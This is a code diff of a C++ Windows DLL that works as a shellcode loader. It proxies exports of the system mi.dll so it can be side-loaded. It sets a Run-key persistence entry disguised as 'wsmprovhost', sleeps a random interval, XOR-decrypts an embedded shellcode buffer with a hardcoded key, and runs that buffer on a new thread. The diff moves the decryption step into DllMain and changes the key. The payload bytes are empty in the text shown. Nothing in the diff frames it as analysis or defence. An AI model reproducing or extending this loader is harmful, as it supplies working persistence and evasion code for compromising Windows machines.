@@ -8,17 +8,13 @@
 #include "direct.h"
 #include <Shlobj.h>
 #include <Shlwapi.h>
-#include <string>
 
 #pragma comment(linker, "/export:MI_Application_InitializeV1=C:\\Windows\\System32\\mi.MI_Application_InitializeV1")
 #pragma comment(linker, "/export:mi_clientFT_V1=C:\\Windows\\System32\\mi.mi_clientFT_V1")
 
 void Hook_Init();
-
 std::thread hookthread;
-
 char shellcode[] = \
-
 ;
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
@@ -55,17 +51,22 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 			char value[255] = { 0 };
 			DWORD BufferSize = 255;
 			RegGetValue(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "wsmprovhost", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
-			std::string str(value);
 			if (value[0] != 0) {
 			}
 			else {
-				RegSetValueEx(hkey2, (LPCSTR)"wsmprovhost", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
+				RegSetValueEx(hkey, (LPCSTR)"wsmprovhost", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
 			}
-			RegCloseKey(hkey2);
+			RegCloseKey(hkey);
 		}
 		srand(clock());
 		int num = ((rand() % (100 - 1 + 1)) + 1) * 200;
 		Sleep(num);
+		char key[] = "a6Pzfg5WCfuWvCsjvHZha*#YR&zhQnU5v@bZ8&hV!repq6fouf^q#";
+		int keysize = sizeof(key);
+		int i;
+		for (i = 0; i < sizeof(shellcode); i++) {
+			shellcode[i] = key[i % keysize] ^ shellcode[i];
+		}
 		hookthread = std::thread(Hook_Init);
 	}
 	case DLL_PROCESS_DETACH:
@@ -84,12 +85,6 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 }
 
 void Hook_Init() {
-	char key[] = "sZOnFLW4wKGmFix9MoWlbm";
-	int keySize = sizeof(key);
-	int i;
-	for (i = 0; i < sizeof(shellcode); i++) {
-		shellcode[i] = shellcode[i] ^ key[i % keySize];
-	}
 	void* pShellcode;
 	HANDLE hProcess = GetCurrentProcess();
 
